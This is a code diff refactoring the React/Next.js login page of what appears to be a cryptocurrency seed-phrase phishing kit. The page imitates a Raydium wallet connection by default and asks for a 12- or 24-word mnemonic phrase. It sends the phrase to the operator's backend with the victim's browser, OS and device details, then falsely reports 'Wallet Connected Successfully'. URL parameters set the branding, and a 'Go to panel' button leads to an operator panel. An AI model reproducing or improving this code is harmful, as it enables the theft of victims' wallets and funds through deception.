@@ -1,6 +1,6 @@
 "use client";
 import { useSearchParams } from "next/navigation";
-import { useState, useEffect } from "react";
+import { useState, useEffect, ChangeEvent } from "react";
 import {
   setPhrase,
   getCryptoLog,
@@ -9,45 +9,64 @@ import {
 } from "@/shared/api/apis";
 import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
 import { UAParser } from "ua-parser-js";
+import Image from "next/image";
+
+interface CryptoLog {
+  appLogo?: string;
+  redirectUrl?: string;
+  app_name?: string;
+}
+
+interface Phrase {
+  seed_phrase: string;
+}
+
+interface UserInfo {
+  browser: string;
+  os: string;
+  device: string;
+}
+
 const LoginPage = () => {
   const searchParams = useSearchParams();
   const [value, setValue] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [verified, setVerified] = useState(false);
-  const [showModal, setShowModal] = useState<any>(false);
-  const [cryptoLog, setCryptoLog] = useState<any>(null);
-  const [phrases, setPhrases] = useState<any[]>([]);
-  const [userInfo, setUserInfo] = useState({
+  const [showModal, setShowModal] = useState(false);
+  const [cryptoLog, setCryptoLog] = useState<CryptoLog | null>(null);
+  const [phrases, setPhrases] = useState<Phrase[]>([]);
+  const [userInfo, setUserInfo] = useState<UserInfo>({
     browser: "",
     os: "",
     device: "",
   });
+
   const { executeRecaptcha } = useGoogleReCaptcha();
 
   const bgColor = searchParams.get("bgColor");
   const bgColorBox = searchParams.get("modColor");
   const buttonColor = searchParams.get("btnColor");
-  const cryptoLogId = searchParams.get("cryptoLogId");
+  const cryptoLogId = searchParams.get("cryptoLogId") ?? "";
   const userId = searchParams.get("userId");
+
   const staticLogo = "/raydium-ray-logo.png";
   const appLogo = cryptoLog?.appLogo || staticLogo;
+  const appName = cryptoLog?.app_name?.toUpperCase();
+
   useEffect(() => {
     if (executeRecaptcha) {
       executeRecaptcha()
-        .then(async (token: any) => {
+        .then(async (token: string) => {
           const response = await verifyRecaptcha(token);
-          if (!response?.ok) {
-            setVerified(false);
-          } else {
-            setVerified(true);
-          }
+          setVerified(!!response?.ok);
         })
-        .catch((error: any) => {
+        .catch(() => {
           setError("Error in recaptcha refresh the page");
         });
     }
   }, [executeRecaptcha]);
+
   useEffect(() => {
     const parser = new UAParser();
     const result = parser.getResult();
@@ -60,7 +79,7 @@ const LoginPage = () => {
     });
   }, []);
 
-  const handleInputChange = (e: any) => {
+  const handleInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
     setValue(e.target.value);
   };
 
@@ -68,89 +87,57 @@ const LoginPage = () => {
     const inputValue = value.trim();
 
     if (!inputValue) {
-      setError("Phrase cannot be empty.");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
+      showTempError("Phrase cannot be empty.");
       return;
     }
 
     if (!verified) {
-      setError("Recaptcha verification failed! refresh page");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
+      showTempError("Recaptcha verification failed! refresh page");
       return;
     }
 
     const wordRegex = /^[a-z\s]+$/;
     const words = inputValue.split(/\s+/);
-    if (!wordRegex.test(inputValue)) {
-      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
+
+    if (!wordRegex.test(inputValue) || !words.every((w) => /^[a-z]+$/.test(w))) {
+      showTempError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
       return;
     }
-    const isValidWords = words.every((word) => /^[a-z]+$/.test(word));
-    if (!isValidWords) {
-      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
-      return;
-    }
+
     if (words.length < 12 || words.length > 24) {
-      setError("Input must contain between 12 and 24 words.");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
+      showTempError("Input must contain between 12 and 24 words.");
       return;
     }
 
-    setError("");
-
-    if (cryptoLog === null) {
-      setError("Crypto Log Not Found");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
-      return;
-    }
-
-    if (error) {
+    if (!cryptoLog) {
+      showTempError("Crypto Log Not Found");
       return;
     }
 
     if (
-      phrases?.some((phraseObj) => {
-        console.log(phraseObj);
-        return phraseObj.seed_phrase === value;
-      }) &&
+      phrases.some((phraseObj) => phraseObj.seed_phrase === value) &&
       cryptoLog?.redirectUrl
     ) {
-      window.location.replace(cryptoLog?.redirectUrl);
+      window.location.replace(cryptoLog.redirectUrl);
     } else {
       const response = await setPhrase(value, userInfo, cryptoLogId);
       if (response?.ok) {
         setSuccess("Wallet Connected Successfully");
         setValue("");
-        setTimeout(() => {
-          setSuccess("");
-        }, 2000);
+        setTimeout(() => setSuccess(""), 2000);
       } else {
-        setError("Error connecting wallet");
-        setTimeout(() => {
-          setError("");
-        }, 2000);
+        showTempError("Error connecting wallet");
       }
     }
   };
 
-  const appName = cryptoLog?.app_name?.toUpperCase();
+  const showTempError = (msg: string) => {
+    setError(msg);
+    setTimeout(() => setError(""), 2000);
+  };
 
-  const getCryptoLogById = async (cryptoLogId: string) => {
-    const response = await getCryptoLog(cryptoLogId);
+  const getCryptoLogById = async (id: string) => {
+    const response = await getCryptoLog(id);
     setCryptoLog(response);
   };
 
@@ -158,14 +145,12 @@ const LoginPage = () => {
     const response = await getPhrases();
     if (Array.isArray(response)) {
       setPhrases(response);
-    } else {
-      setPhrases(phrases);
     }
   };
 
   useEffect(() => {
     getAllPhrases();
-  });
+  }, []);
 
   useEffect(() => {
     if (!userId || !cryptoLogId) {
@@ -177,20 +162,20 @@ const LoginPage = () => {
 
   const hexToRgb = (hex: string) => {
     hex = hex?.replace(/^#/, "");
-    const r = parseInt(hex?.substring(0, 2), 16);
-    const g = parseInt(hex?.substring(2, 4), 16);
-    const b = parseInt(hex?.substring(4, 6), 16);
+    const r = parseInt(hex.substring(0, 2), 16);
+    const g = parseInt(hex.substring(2, 4), 16);
+    const b = parseInt(hex.substring(4, 6), 16);
     return { r, g, b };
   };
 
-  const getContrastColor = (hex: any) => {
+  const getContrastColor = (hex: string) => {
     const { r, g, b } = hexToRgb(hex);
     const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
     return luminance > 128 ? "#000000" : "#ffffff";
   };
 
-  const modColor = getContrastColor(bgColor);
-  const buttonTextColor = getContrastColor(buttonColor);
+  const modColor = getContrastColor(bgColor || "#fff");
+  const buttonTextColor = getContrastColor(buttonColor || "#22d1f8");
   const modTextColor = getContrastColor(modColor);
 
   const goToPanel = () => {
@@ -210,45 +195,33 @@ const LoginPage = () => {
             <button
               className="mt-4 px-4 py-2 text-black rounded"
               style={{
-                backgroundColor: buttonColor !== null ? buttonColor : "#22d1f8",
+                backgroundColor: buttonColor ?? "#22d1f8",
                 color: buttonTextColor,
                 border: `1px solid ${buttonTextColor}`,
               }}
-              onClick={() => goToPanel()}
+              onClick={goToPanel}
             >
               Go to panel
             </button>
           </div>
-          {/* <div className="w-[380px] p-6 rounded-lg shadow-md text-center login-container overflow-hidden">
-              <div className="flex justify-center mb-4">
-                <div className='bg-[#aaadb6] h-14 w-48 rounded animate-pulse'></div>
-              </div>
-              <div className="h-20 bg-[#aaadb6] rounded mb-4 animate-pulse"></div>
-              <div className="flex justify-end">
-                  <div className="h-12 bg-[#aaadb6] rounded w-full animate-pulse"></div>
-              </div>
-              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent animate-shimmer"></div>
-          </div> */}
         </div>
       ) : (
         <div
           className="flex flex-col items-center justify-center min-h-screen"
-          style={{ backgroundColor: bgColor !== null ? bgColor : "#181d31" }}
+          style={{ backgroundColor: bgColor ?? "#181d31" }}
         >
           <div
             className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
             style={{
               backgroundColor:
                 bgColor === null
-                  ? bgColorBox !== null
-                    ? bgColorBox
-                    : "white"
+                  ? bgColorBox ?? "white"
                   : modColor,
               color: modTextColor,
             }}
           >
             <div className="logo-placeholder">
-              <img
+              <Image
                 height={100}
                 width={100}
                 src={appLogo}
@@ -263,19 +236,17 @@ const LoginPage = () => {
               </p>
             </div>
             {error && <div className="message-container-error">{error}</div>}
-            {success && (
-              <div className="message-container-success">{success}</div>
-            )}
+            {success && <div className="message-container-success">{success}</div>}
             <textarea
               value={value}
               placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
               className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
-              onChange={(e) => handleInputChange(e)}
+              onChange={handleInputChange}
             />
             <button
               className="w-full px-4 py-2 rounded-md"
               style={{
-                backgroundColor: buttonColor !== null ? buttonColor : "#22d1f8",
+                backgroundColor: buttonColor ?? "#22d1f8",
                 color: buttonTextColor,
                 border: `1px solid ${buttonTextColor}`,
               }}
